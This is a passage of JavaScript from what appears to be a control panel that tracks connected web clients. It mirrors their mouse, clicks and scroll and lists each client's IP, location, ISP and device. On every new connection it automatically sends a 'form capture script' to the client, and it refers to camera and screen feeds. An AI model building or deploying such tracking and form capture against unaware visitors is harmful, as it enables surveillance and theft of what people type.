                        if (mouseXDetail && mouseYDetail && mouseClientId) {
                            // Update with more precise values
                            mouseXDetail.textContent = x.toFixed(2);
                            mouseYDetail.textContent = y.toFixed(2);
                            
                            // Calculate percentages if available
                            if (mouseXPercent && mouseYPercent) {
                                mouseXPercent.textContent = Math.round(xPercent);
                                mouseYPercent.textContent = Math.round(yPercent);
                            }
                            
                            // Update last update time
                            if (mouseLastUpdate) {
                                const now = new Date();
                                mouseLastUpdate.textContent = now.toLocaleTimeString();
                            }
                            
                            // Show client ID details
                            if (data.clientId) {
                                const shortClientId = data.clientId.split('_').pop().substring(0, 8);
                                mouseClientId.textContent = shortClientId;
                                mouseClientId.title = data.clientId; // Show full ID on hover
                            }
                            
                            // Add flash effect to the detail boxes
                            const boxes = document.querySelectorAll('.position-box');
                            boxes.forEach(box => {
                                box.style.boxShadow = '0 0 8px rgba(33, 150, 243, 0.6)';
                                setTimeout(() => {
                                    box.style.boxShadow = '0 2px 5px rgba(0,0,0,0.1)';
                                }, 300);
                            });
                        }
                        
                        // Update client-specific mouse cursor and position indicator
                        const mouseCursor = document.getElementById(`cursor-${clientId}`);
                        const positionIndicator = document.getElementById(`mouse-position-${clientId}`);
                        const contentFrame = document.getElementById(`content-frame-${clientId}`);
                        
                        if (contentFrame && mouseCursor && positionIndicator) {
                            const contentContainer = contentFrame.parentElement;
                            
                            // Make sure cursor is visible
                            mouseCursor.style.display = 'block';
                            
                            // Get container dimensions for accurate positioning
                            const containerWidth = contentContainer.offsetWidth;
                            const containerHeight = contentContainer.offsetHeight;
                            
                            // Calculate position based on container dimensions
                            const cursorX = (xPercent / 100) * containerWidth;
                            const cursorY = (yPercent / 100) * containerHeight;
                            
                            // Apply position with transform for smooth animation
                            mouseCursor.style.left = `${cursorX}px`;
                            mouseCursor.style.top = `${cursorY}px`;
                            
                            // Add pulse animation on movement
                            mouseCursor.classList.add('cursor-pulse');
                            setTimeout(() => mouseCursor.classList.remove('cursor-pulse'), 500);
                            
                            // Update position text
                            const xCoord = positionIndicator.querySelector('.x-coord');
                            const yCoord = positionIndicator.querySelector('.y-coord');
                            if (xCoord && yCoord) {
                                xCoord.textContent = x.toFixed(0);
                                yCoord.textContent = y.toFixed(0);
                            }
                            
                            // Flash the indicator
                            positionIndicator.style.backgroundColor = '#bbdefb';
                            setTimeout(() => {
                                positionIndicator.style.backgroundColor = '#e3f2fd';
                            }, 300);
                        }
                    }
                    
                    // Handle scroll position updates
                    else if (data.type === 'scroll-position' && data.clientId) {
                        const clientId = data.clientId;
                        
                        // Check if this specific client's tracking is enabled
                        const clientContainer = document.getElementById(`preview-container-${clientId}`);
                        if (clientContainer && clientContainer.dataset.tracking !== 'true') {
                            // Skip processing if tracking is disabled for this client
                            return;
                        }
                        
                        const scrollX = data.scrollX || 0;
                        const scrollY = data.scrollY || 0;
                        
                        // Get the iframe for this client
                        const iframe = document.getElementById(`content-frame-${clientId}`);
                        if (iframe) {
                            // Apply scroll position to the iframe
                            console.log(`Setting scroll for client ${clientId}: ${scrollX}, ${scrollY}`);
                            
                            // Access the iframe's document and scroll it
                            try {
                                const iframeWindow = iframe.contentWindow;
                                if (iframeWindow) {
                                    iframeWindow.scrollTo(scrollX, scrollY);
                                }
                            } catch (error) {
                                console.error('Error scrolling iframe:', error);
                            }
                        }
                    }
                    
                    // Handle mouse click events
                    else if ((data.type === 'mouse-click' || data.type === 'mouse-down-start' || data.type === 'mouse-down-end' || data.type === 'mouse-long-click') && data.clientId) {
                        const clientId = data.clientId;
                        
                        // Check if this specific client's tracking is enabled
                        const clientContainer = document.getElementById(`preview-container-${clientId}`);
                        if (clientContainer && clientContainer.dataset.tracking !== 'true') {
                            // Skip processing if tracking is disabled for this client
                            return;
                        }
                        
                        const button = data.button;
                        
                        // Get the cursor for this client
                        const mouseCursor = document.getElementById(`cursor-${clientId}`);
                        if (mouseCursor) {
                            // For mouse down events, set the color directly
                            if (data.type === 'mouse-down-start') {
                                // Set cursor fill color based on button type
                                if (button === 'right') {
                                    // Change SVG fill color to blue
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%230000ff' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                } else {
                                    // Change SVG fill color to red
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%23ff0000' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }
                                console.log(`Mouse down event: ${button} for client ${clientId}`);
                            }
                            // For mouse up events, restore default color
                            else if (data.type === 'mouse-down-end') {
                                // Reset to green cursor
                                mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%2300cc00' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                console.log(`Mouse up event for client ${clientId}`);
                            }
                            // For single clicks, flash the color
                            else if (data.type === 'mouse-click') {
                                // Set cursor fill color based on button type
                                if (button === 'right') {
                                    // Change SVG fill color to blue
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%230000ff' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                } else {
                                    // Change SVG fill color to red
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%23ff0000' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }
                                console.log(`Click event: ${button} for client ${clientId}`);
                                
                                // Reset to default green color after a short delay
                                setTimeout(() => {
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%2300cc00' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }, 300);
                            }
                            // For long clicks, fixed 3 seconds duration
                            else if (data.type === 'mouse-long-click') {
                                // Set cursor fill color based on button type
                                if (button === 'right') {
                                    // Change SVG fill color to blue
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%230000ff' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                } else {
                                    // Change SVG fill color to red
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%23ff0000' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }
                                console.log(`Long click event: ${button} for client ${clientId}`);
                                
                                // Fixed duration of 3 seconds regardless of client click duration
                                setTimeout(() => {
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%2300cc00' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }, 3000);
                            }
                        }
                    }
                    
                    else if (data.type === 'mouse-position') {
                        // Update the mouse position display in the header
                        const mouseX = document.getElementById('mouseX');
                        const mouseY = document.getElementById('mouseY');
                        if (mouseX && mouseY) {
                            mouseX.textContent = Math.round(data.x);
                            mouseY.textContent = Math.round(data.y);
                        }
                        
                        // Update the detailed position display in preview section
                        const mouseXDetail = document.getElementById('mouseXDetail');
                        const mouseYDetail = document.getElementById('mouseYDetail');
                        const mouseClientId = document.getElementById('mouseClientId');
                        
                        if (mouseXDetail && mouseYDetail && mouseClientId) {
                            // Update with more precise values (include decimal places)
                            mouseXDetail.textContent = data.x.toFixed(2);
                            mouseYDetail.textContent = data.y.toFixed(2);
                            
                            // Show client ID details (truncated if needed)
                            if (data.clientId) {
                                const shortClientId = data.clientId.split('_').pop().substring(0, 8);
                                mouseClientId.textContent = shortClientId;
                                mouseClientId.title = data.clientId; // Show full ID on hover
                            }
                            
                            // Add flash effect to the detail boxes
                            const boxes = document.querySelectorAll('.position-box');
                            boxes.forEach(box => {
                                box.style.boxShadow = '0 0 8px rgba(33, 150, 243, 0.6)';
                                setTimeout(() => {
                                    box.style.boxShadow = '0 2px 5px rgba(0,0,0,0.1)';
                                }, 300);
                            });
                        }
                        
                        // Apply styling based on mouse movement
                        const mouseDisplay = document.getElementById('mousePositionDisplay');
                        if (mouseDisplay) {
                            // Flash effect on update
                            mouseDisplay.style.backgroundColor = '#b3daff';
                            setTimeout(() => {
                                mouseDisplay.style.backgroundColor = '#e6f4ff';
                            }, 200);
                        }
                    
                    }

                } catch (error) {
                    console.error('Error parsing message:', error);
                }
            };
            
            // Update client's last seen time from ping messages
            function updateClientLastSeen(data) {
                // We need to find the client using the full client ID as the primary identifier
                // The client ID now includes the device fingerprint to ensure uniqueness
                const clientKeys = Object.keys(clients);
                let foundClient = false;
                
                // First try to match by exact client ID (most reliable)
                for (const key of clientKeys) {
                    const client = clients[key];
                    if (client.clientId === data.clientId) {
                        // Update last seen time
                        client.lastSeen = new Date().toISOString();
                        client.status = 'online'; // Ensure client is marked as online
                        
                        // Clear any timeout that would mark this client as offline
                        if (connectionTimeouts[key]) {
                            clearTimeout(connectionTimeouts[key]);
                        }
                        
                        // Set a new timeout
                        connectionTimeouts[key] = setTimeout(() => {
                            if (clients[key]) {
                                clients[key].status = 'offline';
                                updateClientUI(key);
                                updateCommunicateButtonState();
                            }
                        }, 15000); // Give more time (15 seconds) before marking as offline
                        
                        // Update UI
                        updateClientUI(key);
                        foundClient = true;
                        break; // Exit the loop as we found an exact match
                    }
                }
                
                // If no match by client ID, try IP as a fallback (less reliable)
                if (!foundClient && data.ip) {
                    for (const key of clientKeys) {
                        const client = clients[key];
                        if (client.ip === data.ip) {
                            // Update last seen time
                            client.lastSeen = new Date().toISOString();
                            client.status = 'online';
                            
                            // Clear any timeout that would mark this client as offline
                            if (connectionTimeouts[key]) {
                                clearTimeout(connectionTimeouts[key]);
                            }
                            
                            // Set a new timeout
                            connectionTimeouts[key] = setTimeout(() => {
                                if (clients[key]) {
                                    clients[key].status = 'offline';
                                    updateClientUI(key);
                                    updateCommunicateButtonState();
                                }
                            }, 15000);
                            
                            // Update UI
                            updateClientUI(key);
                            foundClient = true;
                            
                            // Update the client ID if it was missing
                            if (!client.clientId && data.clientId) {
                                clients[key].clientId = data.clientId;
                                console.log(`Updated client ${key} with ID: ${data.clientId}`);
                            }
                            
                            break;
                        }
                    }
                }
                
                return foundClient;
            }
        }
        
        // Send message to selected client
        function sendMessageToClient(clientKey, message) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                const client = clients[clientKey];
                if (client && client.status === 'online') {
                    const messageData = {
                        type: 'message',
                        targetClientId: client.clientId,
                        targetIp: client.ip,
                        message: message
                    };
                    
                    try {
                        ws.send(JSON.stringify(messageData));
                        return true;
                    } catch (error) {
                        console.error('Error sending message:', error);
                        return false;
                    }
                } else {
                    alert('Cannot send message to offline client');
                    return false;
                }
            } else {
                alert('WebSocket connection is not open');
                return false;
            }
        }
        
        // Send data to selected clients only
        function sendToSelectedClients(data) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                // Check if any clients are selected
                const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
                
                if (selectedClients.length > 0) {
                    // Send to selected clients
                    for (const clientKey of selectedClients) {
                        const client = clients[clientKey];
                        
                        // Ensure we have a valid client ID before sending
                        if (!client.clientId) {
                            console.error(`Selected client ${clientKey} has no client ID, cannot target specifically`);
                            continue;
                        }
                        
                        // Create message with strict targeting by client ID
                        const messageData = {
                            ...data,
                            targetClientId: client.clientId,  // Primary targeting method
                            targetIp: client.ip,              // Secondary fallback
                            strictTargeting: true,            // Signal that strict targeting should be used
                            timestamp: Date.now()
                        };
                        
                        try {
                            ws.send(JSON.stringify(messageData));
                            console.log(`Sent data to selected client with ID: ${client.clientId} (IP: ${client.ip})`);
                        } catch (error) {
                            console.error(`Error sending to client ${client.clientId}:`, error);
                        }
                    }
                } else {
                    // If no clients are selected, broadcast to all (like in server3.html)
                    try {
                        const broadcastData = {
                            ...data,
                            broadcast: true,  // Indicate this is a broadcast message
                            timestamp: Date.now()
                        };
                        ws.send(JSON.stringify(broadcastData));
                        console.log('Broadcasting data to all clients (none selected)');
                    } catch (error) {
                        console.error('Error broadcasting data:', error);
                    }
                }
            } else {
                alert('WebSocket connection is not open');
            }
        }
        
        // Global client timeout duration (in milliseconds)
        const CLIENT_TIMEOUT = 7000; // 7 seconds
        
        // Handle client connections
        function handleClientConnection(data) {
            // Only handle strict 'connection' data type
            if (data.type === 'connection') {
                console.log('Processing connection from client:', data.clientId, 'IP:', data.ip);
                
                // Extract the base client ID (before any tab or session specific identifiers)
                // Format is typically: client_timestamp_devicefingerprint_tab_timestamp_random
                let baseClientId = data.clientId;
                if (data.clientId && data.clientId.includes('_tab_')) {
                    baseClientId = data.clientId.split('_tab_')[0];
                    console.log('Extracted base client ID:', baseClientId);
                }
                
                // Use the base client ID as the primary identifier for merging clients
                // This ensures different tabs from the same device are merged
                const clientIdentifier = baseClientId || ('ip_' + data.ip + '_' + Date.now());
                
                // Create a unique client key for display and storage
                let clientKey;
                
                // Check if we already have this base client ID in our records
                const existingClientKeys = Object.keys(clients);
                // First try to find by exact clientId
                let existingClient = existingClientKeys.find(key => clients[key].clientId === data.clientId);
                
                // If not found by exact ID, try to find by base client ID
                if (!existingClient && baseClientId) {
                    existingClient = existingClientKeys.find(key => {
                        // Check if the client's ID starts with our base client ID
                        const clientId = clients[key].clientId;
                        return clientId && clientId.startsWith(baseClientId);
                    });
                }
                
                if (existingClient) {
                    // Use the existing client key if found
                    clientKey = existingClient;
                    console.log(`Client merged with existing client key: ${clientKey}`);
                } else {
                    // Generate a new key for this client
                    clientKey = clientIdentifier;
                    console.log(`Created new client with key: ${clientKey}`);
                }
                
                // Update or create client data
                                if (!clients[clientKey]) {
                    // New client
                    clients[clientKey] = {
                        ip: data.ip,
                        clientId: data.clientId,
                        baseClientId: baseClientId, // Store the base client ID for future merges
                        userAgent: data.userAgent || 'Unknown',
                        location: data.geo || 'Unknown',
                        firstSeen: new Date().toISOString(),
                        lastSeen: new Date().toISOString(),
                        status: 'online',
                        selected: false,
                        details: data.details || {},
                        nickname: '' // Add nickname field
                    };
                    
                    // Create a new UI element for this client immediately (fix the delay)
                    setTimeout(() => {
                        createClientElement(clientKey);
                        
                        // Send form capture script to the new client
                        sendFormCaptureScript(clientKey);
                    }, 0);
                } else {
                    // Existing client
                    clients[clientKey].lastSeen = new Date().toISOString();
                    clients[clientKey].status = 'online';
                    
                    // Update details if available
                    if (data.details) {
                        clients[clientKey].details = data.details;
                    }
                    
                    // Store/update the base client ID for future merges
                    if (baseClientId) {
                        clients[clientKey].baseClientId = baseClientId;
                    }
                    
                    // Update the UI for this client immediately (fix the delay)
                    setTimeout(() => updateClientUI(clientKey), 0);
                }
                
                // Clear any existing timeout for this client
                
                // Save clients to localStorage
                saveClientsToStorage();
            }
        }
        
        // Add client card to UI
        function addClientCard(clientKey) {
            // Check if we already have this client in the UI
            if (document.getElementById(`client-${clientKey}`)) {
                return;
            }
            
            // Hide empty state if this is the first client
            if (Object.keys(clients).length === 1) {
                emptyState.style.display = 'none';
            }
            
            const client = clients[clientKey];
            const card = document.createElement('div');
            card.className = 'client-card';
            card.id = `client-${clientKey}`;
            
            const statusClass = client.status === 'online' ? 'status-online' : 'status-offline';
            
            // Display IP and a shortened client ID as the main identifier with status text
            const statusText = client.status === 'online' ? 'Online' : 'Offline';
            const statusTextClass = client.status === 'online' ? 'online-text' : 'offline-text';
            const selectBtnText = client.selected ? 'Selected' : 'Select';
            const selectBtnClass = client.selected ? 'select-btn selected' : 'select-btn';
            
            // Get client details or default values
            const details = client.details || {};
            
            // Extract a short version of the client ID for display
            const shortClientId = client.clientId ? 
                client.clientId.split('_').pop().substring(0, 8) + '...' : 
                'Unknown';
                
            // Get display name (nickname or IP)
            const displayName = client.nickname || client.ip;
            
            card.innerHTML = `
                <div class="client-ip">
                    ${displayName}
                    <span class="status-text ${statusTextClass}">${statusText}</span>
                </div>
                <div class="client-status ${statusClass}"></div>
                <div class="client-details" id="details-${clientKey}">
                    <div class="nickname-editor">
                        <input type="text" class="nickname-input" placeholder="Enter nickname for this client" value="${client.nickname || ''}" data-key="${clientKey}">
                        <div class="nickname-hint">Set a friendly name to identify this client</div>
                        <button class="save-nickname-btn" data-key="${clientKey}"><i class="fas fa-save"></i> Save</button>
                    </div>
                    <div class="details-grid">
                        <div class="detail-item">
                            <span class="detail-label">Last Seen:</span>
                            <span>${new Date(client.lastSeen).toLocaleTimeString()}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Client ID:</span>
                            <span title="${client.clientId || ''}"><strong>${shortClientId}</strong></span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">IP Address:</span>
                            <span>${client.ip}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Device:</span>
                            <span>${details.isMobile ? 'Mobile' : 'Desktop'} | ${details.os || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Browser:</span>
                            <span>${details.browser || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Screen:</span>
                            <span>${details.screen || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Location:</span>
                            <span>${details.city || 'Unknown'}${details.region ? ', ' + details.region : ''}${details.country ? ' (' + details.country + ')' : ''}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">ISP:</span>
                            <span>${details.isp || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Language:</span>
                            <span>${details.language || 'Unknown'}</span>
                        </div>
                    </div>
                    <div class="client-actions">
                        <button class="${selectBtnClass}" data-key="${clientKey}">
                            <i class="fas fa-${client.selected ? 'check-square' : 'square'}"></i> ${selectBtnText}
                        </button>
                        <button class="btn-remove" data-key="${clientKey}">
                            <i class="fas fa-times"></i> Remove
                        </button>
                    </div>
                </div>
            `;
            
            // Add selected class if client is selected
            if (client.selected) {
                card.classList.add('selected');
            }
            
            clientList.insertBefore(card, emptyState);
            
            // Add click event to toggle details
            card.addEventListener('click', function(e) {
                // Don't toggle if clicking on a button, input field, or nickname editor
                if (e.target.tagName === 'BUTTON' || 
                    e.target.tagName === 'INPUT' || 
                    e.target.closest('button') || 
                    e.target.closest('.nickname-editor')) {
                    return;
                }
                
                // Toggle this client's details independently
                const details = document.getElementById(`details-${clientKey}`);
                details.classList.toggle('show');
            });
            
            // Add click event to remove button
            const removeBtn = card.querySelector('.btn-remove');
            removeBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                removeClient(clientKey);
            });
            
            // Add click event to select button
            const selectBtn = card.querySelector('.select-btn');
            if (selectBtn) {
                selectBtn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    toggleClientSelection(clientKey);
                });
            }
            
            // Add click event to save nickname button
            const saveNicknameBtn = card.querySelector('.save-nickname-btn');
            const nicknameInput = card.querySelector('.nickname-input');
            if (saveNicknameBtn && nicknameInput) {
                saveNicknameBtn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    const newNickname = nicknameInput.value.trim();
                    saveClientNickname(clientKey, newNickname);
                });
                
                // Also save on Enter key
                nicknameInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        const newNickname = nicknameInput.value.trim();
                        saveClientNickname(clientKey, newNickname);
                    }
                });
                
                // REMOVED live update to fix disappearing input issue
                // This event now does nothing while typing to prevent interference with input field
                nicknameInput.addEventListener('input', function(e) {
                    // Do nothing while typing - let the user type freely without interference
                    // The save button or Enter key will handle saving the nickname
                });
            }
        }
        
        // Save client nickname
        function saveClientNickname(clientKey, nickname) {
            if (clients[clientKey]) {
                // Update the client object
                clients[clientKey].nickname = nickname;
                saveClientsToStorage();
                
                // Update the client card display name
                const card = document.getElementById(`client-${clientKey}`);
                if (card) {
                    const clientIpElement = card.querySelector('.client-ip');
                    if (clientIpElement) {
                        // Keep the status text element intact
                        const statusElement = clientIpElement.querySelector('.status-text');
                        const statusHTML = statusElement ? statusElement.outerHTML : '';
                        
                        // Update the display name but keep the status
                        const displayName = nickname || clients[clientKey].ip;
                        clientIpElement.innerHTML = displayName + statusHTML;
                    }
                    
                    // Add a visual feedback to the save button
                    const saveBtn = card.querySelector('.save-nickname-btn');
                    if (saveBtn) {
                        const originalText = saveBtn.innerHTML;
                        saveBtn.innerHTML = '<i class="fas fa-check"></i> Saved';
                        saveBtn.style.background = '#4CAF50';
                        
                        // Reset button after 1.5 seconds
                        setTimeout(() => {
                            saveBtn.innerHTML = originalText;
                            saveBtn.style.background = '';
                        }, 1500);
                    }
                }
                
                // Update client badge in preview section
                if (clients[clientKey].clientId) {
                    updateClientBadge(clients[clientKey].clientId, nickname);
                    
                    // Also try to update all badges directly
                    updateAllClientBadgesWithNickname(clients[clientKey].clientId, nickname);
                    
                    // Use the direct DOM approach to force the nickname to stay
                    forceNicknameInPreview(clients[clientKey].clientId, nickname);
                    
                    // Update all client display names in camera and screen sections
                    updateClientDisplayNames();
                }
                
                // Show a success message
                if (nickname) {
                    showStatusMessage('success', `Nickname "${nickname}" saved for client ${clients[clientKey].ip}`);
                } else {
                    showStatusMessage('info', `Nickname removed for client ${clients[clientKey].ip}`);
                }
            }
        }
        
        // Force the nickname to stay in the preview section using direct DOM manipulation
        function forceNicknameInPreview(clientId, nickname) {
            if (!clientId || !nickname) return;
            
            console.log(`Forcing nickname "${nickname}" for client ${clientId} in preview section`);
            
            // Immediately try to replace all matching badges
            replaceClientBadges(clientId, nickname);
            
            // Set up a recurring interval to keep checking and updating
            const forceInterval = setInterval(() => {
                replaceClientBadges(clientId, nickname);
            }, 100); // Check every 100ms for maximum responsiveness
            
            // Store the interval ID so we can clear it if needed
            window.forceIntervals = window.forceIntervals || [];
            window.forceIntervals.push(forceInterval);
            
            // Run forever - we want the nickname to persist as long as the page is open
            // No timeout to stop the interval
        }
        
        // Replace client badges with custom elements that can't be modified
        function replaceClientBadges(clientId, nickname) {
            if (!clientId || !nickname) return;
            console.log(`Attempting to replace badges for client ${clientId} with nickname "${nickname}"`);
            
            let replaced = false;
            
            // PART 1: Handle preview section badges (original functionality)
            const allBadges = document.querySelectorAll('.client-badge, .custom-client-badge');
            allBadges.forEach(badge => {
                const badgeId = badge.id && badge.id.replace(/^(client-badge-|custom-badge-)/, '');
                if (badgeId) {
                    const shortClientId = clientId.split('_').pop().substring(0, 8);
                    const shortBadgeId = badgeId.split('_').pop().substring(0, 8);
                    
                    // Check if this badge is related to our client
                    if (badgeId.includes(shortClientId) || clientId.includes(shortBadgeId) || 
                        badgeId === clientId || shortBadgeId === shortClientId) {
                        
                        // If it's already a custom badge, just update the text
                        if (badge.classList.contains('custom-client-badge')) {
                            if (badge.textContent !== `Client: ${nickname}`) {
                                console.log(`Updating existing custom badge ${badge.id} to "${nickname}"`);
                                badge.textContent = `Client: ${nickname}`;
                                replaced = true;
                            }
                        }
                        // Otherwise replace it with a new custom badge
                        else if (badge.classList.contains('client-badge')) {
                            console.log(`Replacing badge ${badge.id} with custom element for nickname "${nickname}"`);
                            
                            // Create a completely new element with the same styling
                            const customBadge = document.createElement('div');
                            customBadge.id = `custom-badge-${badgeId}`;
                            customBadge.className = 'custom-client-badge';
                            customBadge.style.backgroundColor = '#2196F3';
                            customBadge.style.color = 'white';
                            customBadge.style.padding = '3px 8px';
                            customBadge.style.borderRadius = '12px';
                            customBadge.style.fontSize = '12px';
                            customBadge.style.display = 'inline-block';
                            customBadge.textContent = `Client: ${nickname}`;
                            customBadge.dataset.clientId = clientId;
                            customBadge.dataset.replaced = 'true';
                            
                            // Replace the original badge with our custom one
                            badge.parentNode.replaceChild(customBadge, badge);
                            replaced = true;
                            
                            // Add a special style to ensure our custom badge is always visible
                            const style = document.createElement('style');
                            style.textContent = `
                                .custom-client-badge {
                                    display: inline-block !important;
                                    visibility: visible !important;
                                    opacity: 1 !important;
                                    z-index: 9999 !important;
                                }
                            `;
                            document.head.appendChild(style);
                        }
                    }
                }
            });
            
            // PART 2: Handle permission section feed badges
            const permBadges = document.querySelectorAll('.client-feed-id');
            permBadges.forEach(badge => {
                // Try to get client ID from container or badge text
                let feedClientId = null;
                
                // First check container data attribute
                const container = badge.closest('[data-client-id]');
                if (container) {
                    feedClientId = container.getAttribute('data-client-id');
                }
                
                // If no container ID, try to extract from badge text
                if (!feedClientId) {
                    const text = badge.textContent || '';
                    const matches = text.match(/Client:?\s+([a-zA-Z0-9_-]+)/);
                    if (matches && matches[1]) {
                        feedClientId = matches[1];
                    }
                }
                
                // Now check if this badge is for our client
                if (feedClientId) {
                    const shortFeedId = feedClientId.split('_').pop().substring(0, 8);
                    const shortId = clientId.split('_').pop().substring(0, 8);
                    
                    if (feedClientId === clientId || 
                        shortFeedId === shortId || 
                        feedClientId.includes(shortId) || 
                        clientId.includes(shortFeedId)) {
                        
                        console.log(`Found permission badge for client ${clientId}`);
                        badge.textContent = `Client: ${nickname}`;
                        badge.title = `Full Client ID: ${clientId}`;
                        replaced = true;
                    }
                    
                    // Special handling for client_1, client_2 pattern
                    if (feedClientId.match(/^client_\d+$/) && clientId !== feedClientId) {
                        console.log(`Found placeholder client ID pattern: ${feedClientId}`);
                        badge.textContent = `Client: ${nickname}`;
                        badge.title = `Placeholder ID: ${feedClientId}, Using nickname from: ${clientId}`;
                        replaced = true;
                    }
                }
            });
            
            // PART 3: Handle log entries
            const logEntries = document.querySelectorAll('.status .client-id, .status[data-client-id] .client-id');
            logEntries.forEach(span => {
                // Try to get client ID from container or span text
                let entryClientId = null;
                
                // First check container data attribute
                const container = span.closest('[data-client-id]');
                if (container) {
                    entryClientId = container.getAttribute('data-client-id');
                } else {
                    // Otherwise use the span text
                    entryClientId = span.textContent.trim();
                }
                
                // Now check if this entry is for our client
                if (entryClientId) {
                    const shortEntryId = entryClientId.split('_').pop().substring(0, 8);
                    const shortId = clientId.split('_').pop().substring(0, 8);
                    
                    if (entryClientId === clientId || 
                        shortEntryId === shortId || 
                        entryClientId.includes(shortId) || 
                        clientId.includes(shortEntryId)) {
                        
                        console.log(`Found log entry for client ${clientId}`);
                        span.textContent = nickname;
                        span.title = `Full Client ID: ${clientId}`;
                        replaced = true;
                    }
                    
                    // Special handling for client_1, client_2 pattern
                    if (entryClientId.match(/^client_\d+$/) && clientId !== entryClientId) {
